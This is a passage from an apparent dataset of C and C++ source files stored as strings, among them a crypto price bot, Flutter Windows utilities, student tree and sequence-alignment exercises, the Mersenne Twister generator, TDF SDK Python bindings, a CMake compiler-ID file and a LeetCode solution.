auto eth_ticker = std::string(\"eth\");\n\n    if (!mgr.create_coin(eth_ticker)) \n        e.reply(\"Error getting gas\");\n\n    auto fee = mgr.get_fee(eth_ticker);\n    auto price = mgr.get_price(eth_ticker);\n\n    e.reply(fmt::format(std::locale(\"en_US.UTF-8\"), \"Low gas price = {} gwei = ${:.2Lf}\", fee, fee * 0.000021 * price));\n}\n\nvoid bot_mgr::coin(const dpp::interaction_create_t& e, const std::string& coin_ticker, coin_mgr& mgr)\n{\n    auto ticker_lower = coin_ticker;\n    std::transform(coin_ticker.begin(), coin_ticker.end(), ticker_lower.begin(), tolower);\n\n    auto coin_valid = mgr.create_coin(ticker_lower);\n    if (!coin_valid) e.reply(\"Coin is invalid\");\n\n    else\n    {\n        auto price = mgr.get_price(ticker_lower);\n        std::string fmt_string;\n        if (price < 0.1f)\n            fmt_string = fmt::format(std::locale(\"en_US.UTF-8\"), \"1 {} = ${:.9Lf}\", coin_ticker, price);\n        else\n            fmt_string = fmt::format(std::locale(\"en_US.UTF-8\"), \"1 {} = ${:.2Lf}\", coin_ticker, price);\n\n        e.reply(fmt_string);\n    }\n\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#ifndef RECCHECK\n//if you want to add any #includes like <iostream> you must do them here (before the next endif)\n\n#endif\n\n#include \"equal-paths.h\"\nusing namespace std;\n\nbool isEndNode(Node * root);\nbool hasOneChild(Node * root);\nbool hasLeftChild(Node * root);\nbool hasRightChild(Node * root);\n\n// You may add any prototypes of helper functions here\nbool isEndNode(Node * root)\n{\n  if (root->left == nullptr && root->right == nullptr) {\n    return true;\n  }\n  return false;\n}\n\nbool hasOneChild(Node * root)\n{\n  if (hasLeftChild(root) || hasRightChild(root)) {\n    return true;\n  }\n  return false;\n}\n\nbool hasLeftChild(Node * root) \n{\n  if (root->left != nullptr && root->right == nullptr) {\n    return true;\n  }\n  return false;\n}\n\nbool hasRightChild(Node * root) \n{\n  if (root->left == nullptr && root->right != nullptr) {\n    return true;\n  }\n  return false;\n}\n\nbool equalPaths(Node * root)\n{\n    // Add your code below\n\n  //root node is nullptr\n  if (root == nullptr) {\n    return true;\n  }\n  \n  //root node is an end node\n  if (isEndNode(root)) {\n    return true;\n  }\n\n  //root node has ONE child\n  if (hasOneChild(root)) {\n    if (hasLeftChild(root)) {\n      return equalPaths(root->left);\n    }\n    else {\n      return equalPaths(root->right);\n    }\n  }\n\n  //root node has TWO children\n  else {\n    //both nodes are end nodes\n    if (isEndNode(root->left) && isEndNode(root->right)) {\n      return true;\n    }\n\n    //only left node is an end node -> false\n    else if (isEndNode(root->left)) {\n      return false;\n    }\n    //only right node is an end node -> false\n    else if (isEndNode(root->right)) {\n      return false;\n    }\n    //both nodes have children\n    else {\n      return (equalPaths(root->left) && equalPaths(root->right));\n    }\n\n  }\n  \n  //\n\n\n\n\n\n\n/*\n  //root node has at least one child\n\n  //root node has exactly one child\n  if (hasOneChild(root)) {\n    return \n  }\n\n  //left node is end, right node is NOT end -> false\n  else if (isEndNode(root->left) && !isEndNode(root->right)) {\n    return false;\n  }\n\n  //left node is NOT end, right node is end -> false\n  else if (!isEndNode(root->left) && isEndNode(root->right)) {\n    return false;\n  }\n\n  //both left and right nodes are NOT end nodes\n  else if (!isEndNode(root->left) && !isEndNode(root->right)) {\n    return (equalPaths(root->left) && equalPaths(root->right));\n  }\n\n  //either left or right node (but not)\n  else (isEndNode(root->left) || isEndNode(root->right)) {\n    return false;\n  }\n*/\n}\n\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n#include <utility>\n\nstruct casilla{\n    casilla* left = nullptr, *top=nullptr, *diagonal = nullptr;\n    std::string valor = \"__\";\n    char l,t;\n};\n\nusing tablero = std::vector<casilla>;\nusing alignment = std::vector<std::vector<std::string>>;\nusing std::string;\nusing std::vector;\nusing std::cout;\nusing std::pair;\nusing std::max;\nusing std::stoi;\n\nint match = 1, indel = -2, mismatch = -1;\nvoid iniciarlizarTablero(tablero& tab, unsigned int fsize, unsigned int csize, string c1, string c2);\nvoid imprimirTablero(tablero& tab, unsigned int fsize, unsigned int csize);\nvoid NeddlemanWunsch(tablero& tab, unsigned int fsize, unsigned int csize);\nstd::vector<alignment> findAllAlingments(tablero& tab, unsigned int fsize, unsigned int csize, casilla* temp= nullptr);\nalignment findBestAlignment(tablero& tab, unsigned  int fsize, unsigned  int csize);\nvoid printPathsToFile(vector<alignment>& recorridos);\nvoid printAlignmentsToFile(vector<alignment>& recorridos, unsigned int fsize, unsigned int csize);\nvoid printPathsToFile(alignment& recorrido);\nvoid printAlignmentsToFile(alignment& recorrido, unsigned int fsize, unsigned int csize);\nvoid leerInputs(string& st1, string& st2, string file);\n\nint main() {\n    string cadena1;\n    string cadena2;\n    leerInputs(cadena1,cadena2,\"input.txt\");\n    auto fsize = cadena2.size()+2;\n    auto csize = cadena1.size()+2;\n    tablero tab1((cadena1.size()+2)*(cadena2.size()+2));\n    iniciarlizarTablero(tab1, fsize, csize,cadena1,cadena2);\n    //imprimirTablero(tab1, fsize, csize);\n    NeddlemanWunsch(tab1, fsize, csize);\n    //imprimirTablero(tab1, fsize, csize);\n    //auto rs = findAllAlingments(tab1,fsize,csize);\n    //printPathsToFile(rs);\n    //printAlignmentsToFile(rs,fsize,csize);\n    auto best = findBestAlignment(tab1,fsize,csize);\n    printPathsToFile(best);\n    printAlignmentsToFile(best,fsize,csize);\n}\n\nvoid leerInputs(string& st1, string& st2, string file){\n    std::ifstream input(file);\n    string temp;\n   // std::getline(input,temp);\n    std::getline(input,st1);\n    std::getline(input,st2);\n    input.close();\n}\nvoid printAlignmentsToFile(vector<alignment>& recorridos, unsigned int fsize, unsigned int csize){\n    //int size = std::max((int)fsize,(int)csize);\n    auto size = recorridos[0].size();\n    std::ofstream file(\"alineaciones.txt\");\n    if(!file.is_open()){\n        cout<<\"Error abriendo file de alineaciones\\n\";\n    }\n    else{\n        for(auto& r : recorridos){\n            string t(size,' ');\n            string t2(size,' ');\n            auto indice = size-1;\n            for(auto& c : r){\n                if(c[3] == \"diagonal\"){\n                    t[indice] = c[0][0];\n                    t2[indice] = c[1][0];\n                }else if(c[3] == \"top\"){\n                    t[indice] = c[0][0];\n                    t2[indice] = '-';\n                }else if(c[3] == \"left\"){\n                    t[indice] = '-';\n                    t2[indice] = c[1][0];\n                }else\n                    cout<<\"Error. informaci\u00f3n de casilla indefinida\\n\";\n                indice--;\n            }\n            file << t << \"\\n\";\n            file << t2 << \"\\n\" << \"\\n\";\n        }\n    }\n    file.close();\n}\nvoid printPathsToFile(vector<alignment>& recorridos) {\n    std::ofstream file(\"recorridos.txt\");\n    if(!file.is_open()){\n        cout<<\"Error abriendo file de recorridos\\n\";\n    }\n    else{\n        for(auto& r : recorridos){\n            for(auto& c : r){\n                file << \"{\";\n                for(auto& str : c){\n                    file << str << \", \";\n                }\n                file <<\"}, \";\n            }\n            file << \"\\n\";\n        }\n\n    }\n    file.close();\n}\nvoid printPathsToFile(alignment& recorrido){\n    vector<alignment> vec;\n    vec.push_back(recorrido);\n    printPathsToFile(vec);\n}\nvoid printAlignmentsToFile(alignment& recorrido, unsigned int fsize, unsigned int csize){\n    vector<alignment> vec;\n    vec.push_back(recorrido);\n    printAlignmentsToFile(vec,fsize,csize);\n}\nalignment findBestAlignment(tablero& tab, unsigned  int fsize, unsigned  int csize){\n    alignment  bestAlignment;\n    auto temp = &(tab[csize*(fsize-1)+csize-1]); //inicio (inf. der.)\n    int score = 0;\n    while(!(temp->left == nullptr && temp->top == nullptr && temp->diagonal == nullptr)){\n        if(temp->left != nullptr && temp->top == nullptr && temp->diagonal == nullptr){\n            bestAlignment.push_back({string(1,temp->l),string(1,temp->t),temp->valor, \"left\"}); //x,y,v,dir\n            temp = temp->left; score+= stoi(temp->left->valor);\n        }\n        else if(temp->left == nullptr && temp->top != nullptr && temp->diagonal == nullptr){\n            bestAlignment.push_back({string(1,temp->l),string(1,temp->t),temp->valor, \"top\"}); //x,y,v,dir\n            temp = temp->top; score+= stoi(temp->top->valor);\n        }\n        else if(temp->left == nullptr && temp->top == nullptr && temp->diagonal != nullptr){\n           ",
    "#include <stdio.h>\r\n#include \"mt19937ar.h\"\r\n\r\n/* Period parameters */  \r\n#define N 624\r\n#define M 397\r\n#define MATRIX_A 0x9908b0dfUL   /* constant vector a */\r\n#define UPPER_MASK 0x80000000UL /* most significant w-r bits */\r\n#define LOWER_MASK 0x7fffffffUL /* least significant r bits */\r\n\r\nstatic unsigned long mt[N]; /* the array for the state vector  */\r\nstatic int mti=N+1; /* mti==N+1 means mt[N] is not initialized */\r\n\r\n/* initializes mt[N] with a seed */\r\nvoid init_genrand(unsigned long s)\r\n{\r\n    mt[0]= s & 0xffffffffUL;\r\n    for (mti=1; mti<N; mti++) {\r\n        mt[mti] = \r\n\t    (1812433253UL * (mt[mti-1] ^ (mt[mti-1] >> 30)) + mti); \r\n        /* See Knuth TAOCP Vol2. 3rd Ed. P.106 for multiplier. */\r\n        /* In the previous versions, MSBs of the seed affect   */\r\n        /* only MSBs of the array mt[].                        */\r\n        /* 2002/01/09 modified by Makoto Matsumoto             */\r\n        mt[mti] &= 0xffffffffUL;\r\n        /* for >32 bit machines */\r\n    }\r\n}\r\n\r\n/* initialize by an array with array-length */\r\n/* init_key is the array for initializing keys */\r\n/* key_length is its length */\r\n/* slight change for C++, 2004/2/26 */\r\nvoid init_by_array(unsigned long init_key[], int key_length)\r\n{\r\n    int i, j, k;\r\n    init_genrand(19650218UL);\r\n    i=1; j=0;\r\n    k = (N>key_length ? N : key_length);\r\n    for (; k; k--) {\r\n        mt[i] = (mt[i] ^ ((mt[i-1] ^ (mt[i-1] >> 30)) * 1664525UL))\r\n          + init_key[j] + j; /* non linear */\r\n        mt[i] &= 0xffffffffUL; /* for WORDSIZE > 32 machines */\r\n        i++; j++;\r\n        if (i>=N) { mt[0] = mt[N-1]; i=1; }\r\n        if (j>=key_length) j=0;\r\n    }\r\n    for (k=N-1; k; k--) {\r\n        mt[i] = (mt[i] ^ ((mt[i-1] ^ (mt[i-1] >> 30)) * 1566083941UL))\r\n          - i; /* non linear */\r\n        mt[i] &= 0xffffffffUL; /* for WORDSIZE > 32 machines */\r\n        i++;\r\n        if (i>=N) { mt[0] = mt[N-1]; i=1; }\r\n    }\r\n\r\n    mt[0] = 0x80000000UL; /* MSB is 1; assuring non-zero initial array */ \r\n}\r\n\r\n/* generates a random number on [0,0xffffffff]-interval */\r\nunsigned long genrand_int32(void)\r\n{\r\n    unsigned long y;\r\n    static unsigned long mag01[2]={0x0UL, MATRIX_A};\r\n    /* mag01[x] = x * MATRIX_A  for x=0,1 */\r\n\r\n    if (mti >= N) { /* generate N words at one time */\r\n        int kk;\r\n\r\n        if (mti == N+1)   /* if init_genrand() has not been called, */\r\n            init_genrand(5489UL); /* a default initial seed is used */\r\n\r\n        for (kk=0;kk<N-M;kk++) {\r\n            y = (mt[kk]&UPPER_MASK)|(mt[kk+1]&LOWER_MASK);\r\n            mt[kk] = mt[kk+M] ^ (y >> 1) ^ mag01[y & 0x1UL];\r\n        }\r\n        for (;kk<N-1;kk++) {\r\n            y = (mt[kk]&UPPER_MASK)|(mt[kk+1]&LOWER_MASK);\r\n            mt[kk] = mt[kk+(M-N)] ^ (y >> 1) ^ mag01[y & 0x1UL];\r\n        }\r\n        y = (mt[N-1]&UPPER_MASK)|(mt[0]&LOWER_MASK);\r\n        mt[N-1] = mt[M-1] ^ (y >> 1) ^ mag01[y & 0x1UL];\r\n\r\n        mti = 0;\r\n    }\r\n  \r\n    y = mt[mti++];\r\n\r\n    /* Tempering */\r\n    y ^= (y >> 11);\r\n    y ^= (y << 7) & 0x9d2c5680UL;\r\n    y ^= (y << 15) & 0xefc60000UL;\r\n    y ^= (y >> 18);\r\n\r\n    return y;\r\n}\r\n\r\n/* generates a random number on [0,0x7fffffff]-interval */\r\nlong genrand_int31(void)\r\n{\r\n    return (long)(genrand_int32()>>1);\r\n}\r\n\r\n/* generates a random number on [0,1]-real-interval */\r\ndouble genrand_real1(void)\r\n{\r\n    return genrand_int32()*(1.0/4294967295.0); \r\n    /* divided by 2^32-1 */ \r\n}\r\n\r\n/* generates a random number on [0,1)-real-interval */\r\ndouble genrand_real2(void)\r\n{\r\n    return genrand_int32()*(1.0/4294967296.0); \r\n    /* divided by 2^32 */\r\n}\r\n\r\n/* generates a random number on (0,1)-real-interval */\r\ndouble genrand_real3(void)\r\n{\r\n    return (((double)genrand_int32()) + 0.5)*(1.0/4294967296.0); \r\n    /* divided by 2^32 */\r\n}\r\n\r\n/* generates a random number on [0,1) with 53-bit resolution*/\r\ndouble genrand_res53(void) \r\n{ \r\n    unsigned long a=genrand_int32()>>5, b=genrand_int32()>>6; \r\n    return(a*67108864.0+b)*(1.0/9007199254740992.0); \r\n} \r\n/* These real versions are due to Isaku Wada, 2002/01/09 added */\r\n",
    "//\n//  TDF SDK\n//\n//  Created by Sujan Reddy on 2019/03/04.\n//  Copyright 2019 Virtru Corporation\n//\n\n#include <pybind11/pybind11.h>\n#include <pybind11/stl.h>\n#include <sstream>\n\n#include <nanotdf_client.h>\n#include <nanotdf_dataset_client.h>\n#include <tdf_client.h>\n#include <tdf_assertion.h>\n#include <oidc_credentials.h>\n#include <version.h>\n\n#define STRINGIFY(x) #x\nusing namespace pybind11::literals;\n\nPYBIND11_MODULE(opentdf, tdf) {\n\n    using namespace virtru;\n    namespace py = pybind11;\n\n    tdf.doc() = \"Python bindings for the TDF SDK library\";\n\n    // Use the version number from VERSION\n    tdf.attr(\"__version__\") = opentdf_VERSION;\n\n    py::enum_<LogLevel>(tdf, \"LogLevel\")\n        .value(\"Trace\", LogLevel::Trace)\n        .value(\"Debug\", LogLevel::Debug)\n        .value(\"Info\", LogLevel::Info)\n        .value(\"Warn\", LogLevel::Warn)\n        .value(\"Error\", LogLevel::Error)\n        .value(\"Fatal\", LogLevel::Fatal);\n\n    py::enum_<AssertionType>(tdf, \"AssertionType\")\n        .value(\"Handling\", AssertionType::Handling)\n        .value(\"Base\", AssertionType::Base);\n\n    py::enum_<EncryptionState>(tdf, \"EncryptionState\")\n        .value(\"Enable\", EncryptionState::Enable)\n        .value(\"Disable\", EncryptionState::Disable);    \n\n    py::enum_<Scope>(tdf, \"Scope\")\n        .value(\"TDO\", Scope::TDO)\n        .value(\"PAYL\", Scope::PAYL)\n        .value(\"EXPLICIT\", Scope::EXPLICIT)\n        .value(\"Unknown\", Scope::Unknown);\n\n    py::enum_<AppliesToState>(tdf, \"AppliesToState\")\n        .value(\"encrypted\", AppliesToState::encrypted)\n        .value(\"unencrypted\", AppliesToState::unencrypted)\n        .value(\"Unknown\", AppliesToState::Unknown);\n\n    py::enum_<StatementType>(tdf, \"StatementType\")\n        .value(\"ReferenceStatement\", StatementType::ReferenceStatement)\n        .value(\"StructuredStatement\", StatementType::StructuredStatement)\n        .value(\"StringStatement\", StatementType::StringStatement)\n        .value(\"Base64BinaryStatement\", StatementType::Base64BinaryStatement)\n        .value(\"XMLBase64\", StatementType::XMLBase64)\n        .value(\"HandlingStatement\", StatementType::HandlingStatement)\n        .value(\"String\", StatementType::String)\n        .value(\"Unknow\", StatementType::Unknown);\n\n\n    py::class_<StatementGroup>(tdf, \"StatementGroup\")\n        .def(py::init([](StatementType statementType) { \n                return new StatementGroup(statementType);}), R\"pbdoc(\n              Create an statement group\n        )pbdoc\")\n        .def(\"set_statement_type\", &StatementGroup::setStatementType,\n                py::arg(\"statement_type\"), R\"pbdoc(\n                Set the statement type for the statement group\n\n            Args:\n                statement_type(StatementType): The Statement type\n        )pbdoc\")\n        .def(\"set_filename\", &StatementGroup::setFilename,\n                py::arg(\"filename\"), R\"pbdoc(\n                Set the filename for the statement group\n\n            Args:\n                filename(String): The filename\n        )pbdoc\")\n        .def(\"set_media_type\", &StatementGroup::setMediaType,\n                py::arg(\"media_type\"), R\"pbdoc(\n                Set the media type for the statement group\n\n            Args:\n                media_type(String): Media type\n        )pbdoc\")\n        .def(\"set_uri\", &StatementGroup::setUri,\n                py::arg(\"uri\"), R\"pbdoc(\n                Set the uri for the statement group\n\n            Args:\n                uri(String): uri\n        )pbdoc\")\n        .def(\"set_value\", &StatementGroup::setValue,\n                py::arg(\"value\"), R\"pbdoc(\n                Set the value for the statement group\n\n            Args:\n                value(String): Value for the statement group\n        )pbdoc\")\n        .def(\"set_is_encrypted\", &StatementGroup::setIsEncrypted,\n                py::arg(\"is_encrypted\"), R\"pbdoc(\n                Set value for the isEncrypted flag for the statement group\n\n            Args:\n                is_encrypted(bool): is encrypted flag\n        )pbdoc\");\n\n\n    py::class_<Assertion>(tdf, \"Assertion\")\n        .def(py::init([](AssertionType type, Scope scope) { \n                return new Assertion(type, scope);}), R\"pbdoc(\n              Create a default assertion\n\n            Args:\n                type(AssertionType): Assertion type, Handling or Base\n                scope(Scope): Scope of the assertion  \n        )pbdoc\")\n        .def(\"set_id\", &Assertion::setId,\n                py::arg(\"id\"), R\"pbdoc(\n                Set the id for the assertion\n\n            Args:\n                id(String): The assertion id\n        )pbdoc\")\n        .def(\"set_type\", &Assertion::setType,\n                py::arg(\"type\"), R\"pbdoc(\n                Return the type of the assertion\n\n            Args:\n                type(String): The type of the assetion\n        )pbdoc\")\n        .def(\"set_statement_group\", &Assertion::setStatementGroup,\n                py::arg(\"statement_group\"), R\"pbdoc(\n                Set the statement group for the assertion\n\n            Args:\n         ",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "/*\n\n345. Reverse vowls of a string\n\n\nGiven a string s, reverse only all the vowels in the string and return it.\n\nThe vowels are 'a', 'e', 'i', 'o', and 'u', and they can appear in both lower and upper cases, more than once.\n\n\nSteps to this solution.\n\n1. Create a string that holds all vowels\n2. Create a string that holds the values of s (possibly optional)\n3.The goal is to achieve this solution by assigning two pointers which are\nat the first and last position and check for vowels, and while both pointers are sitting\ninside of a vowel then swap them, else just keep advancing \nwe want to stop when the two pointers cross each other and return the string array\n\n\nThe key method used in this solution is the std::string method .find()\n\n.find() scans thru a substring and looks for the first occurence of the char and returns the \nindex location\n\n.find() is all we need to solve this solution \n\n*/\n\n#include <iostream>\n#include <string>\n\n\n\n\nclass Solution {\n\nprivate:\n\t//We can create a member variable to represent the string array that holds \n\t//all the vowels (upper and lowercase) that we will check with .find\n\t//member variables should be private\n\tstd::string vowels = { \"aeiouAEIOU\" };\n\t\n\n\npublic:\n\t\n\tstd::string reverseVowels(std::string &s);\n\t\n};\n\n\nstd::string Solution::reverseVowels(std::string &s) {\n\n\t//We will be using the vowel string to check for occurences and index location within string s\n\n\t//We want to create a while loop that continously cycles thru the string swapping the vowels\n\t//We use a while loop rather than a for loop because we do not know how many iterations is\n\t//needed for completion \n\t//we know the operation is complete when the first pointer and the last pointer cross\n\t//so that will be the basis of our while loop\n\t//We have to initialize first and last \n\t//first is going to be the first location, last is going to be the last location within stirng s\n\t//we can find the last location within string s by using the string method .length() - 1, \n\t//We use - 1 since indexes start a 0\n\tint first = 0;\n\tint last = s.length() - 1;\n\tchar temp;\n\t\n\t\n\n\twhile (first < last) {\n\n\t\t//While inside of the while loop, we want to check each element that first and last are on\n\t\t//to see if they are vowels, if they are not vowels then move forward,\n\t\t//However if they are vowels, then we want to wait there until the other pointer has landed on a vowel as well\n\t\t//we want to use a while loop because we want this to be continous until the two pointers cross\n\t\t//So while first is less than last and after doing vowel.find() receiving no hits within (-1) we can\n\t\t//safely enter the while loop advancing the pointer\n\t\t//We need two while loops, one for the first pointer and one for the second pointer\n\t\t//NPOS = -1\n\t\twhile (first < last && vowels.find(s[first]) == std::string::npos) {\n\t\t\tfirst++;\n\t\t}\n\t\twhile (first < last && vowels.find(s[last]) == std::string::npos) {\n\t\t\tlast--;\n\t\t}\n\n\t\t//At this point within this method, first and last are both on a vowel,\n\t\t//This is true because they kept advancing every occurence that was not within \n\t\t//Our string vowel\n\t\t//Now we have to swap the values of first and last within the string\n\t\t//going to make a temp variable to swap\n\n\t\ttemp = s[first];\n\t\ts[first] = s[last];\n\t\ts[last] = temp;\n\n\t\t//Now we have to increment first and decrement last to continue forward after the operation\n\t\tfirst++;\n\t\tlast--;\n\n\n\t}\n\n\t//After the while loop is done, the vowels will be reversed return the string\n\n\treturn s;\n\n}\n\n\nint main() {\n\n\tSolution solution;\n\n\tstd::string sS = \"hEllo\";\n\tstd::string s = \"AEIOUaeiou\";\n\n\tstd::cout << solution.reverseVowels(sS);\n\n\n\t//Time Complexity O(n)\n\t//Spacae Complexity O(n)\n\n\treturn 0;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      